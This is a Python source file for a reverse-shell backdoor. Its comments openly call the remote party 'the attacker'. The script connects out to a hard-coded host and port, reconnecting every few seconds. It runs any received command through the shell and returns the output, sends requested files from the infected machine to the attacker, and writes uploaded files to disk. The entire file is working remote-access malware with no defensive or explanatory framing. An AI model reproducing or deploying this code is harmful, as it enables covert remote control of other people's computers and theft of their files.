import os
import socket
import subprocess
import time

#Manipulate the commands received from the attacker; also the new operation download / upload files
def receive_commands():
    while True:

        data = s.recv(1024)

        if data[:3].decode("utf-8") == 'cd ':
            try:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                os.chdir(data[3:])
                s.send(str.encode(os.getcwd() + '> '))

            except FileNotFoundError:
                s.send(output_bytes + str.encode(os.getcwd() + '> '))

        elif data[:8].decode("utf-8") == 'download':

            file_name = data[9:].decode("utf-8")
            try:
                with open(file_name, 'rb') as f:
                    sending = True
                    while sending:
                        file_to_send = f.read(1024)
                        if file_to_send == b'':
                            f.close()
                            time.sleep(0.3)
                            s.send(str.encode("EOFEOFEOFEOFEOF"))
                            s.send(str.encode(os.getcwd() + '> '))
                            sending = False
                        else:
                            s.send(file_to_send)
            except FileNotFoundError:
                s.send(str.encode("Requested file not found"))
                time.sleep(0.3)
                s.send(str.encode(os.getcwd() + '> '))

        elif data[:6].decode("utf-8") == 'upload':
            down_file = data[7:]
            receive_file = True
            data = s.recv(1024)

            with open(down_file, 'wb') as f:
                while receive_file:
                    if data.endswith(b"EOFEOFEOFEOFEOF"):
                        data = data[:-15]
                        f.write(data)
                        f.close()
                        s.send(str.encode(os.getcwd() + '> '))
                        receive_file = False
                    else:
                        f.write(data)
                        data = s.recv(1024)

        elif len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8", errors='ignore')
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))

        while not data:
            connect_to_server()


#Create connection with the attacker + manage the incoming commands
def connect_to_server():
    try:
        global host
        global port
        global s
        host = "192.168.0.102"
        port = 9999
        s = socket.socket()
        s.connect((host, port))
        s.send(str.encode(os.getcwd() + '> '))
        receive_commands()
    except (ConnectionRefusedError, ConnectionResetError, ConnectionAbortedError):
        time.sleep(5)
        connect_to_server()

def main():
    connect_to_server()


if __name__ == "__main__":
    main()
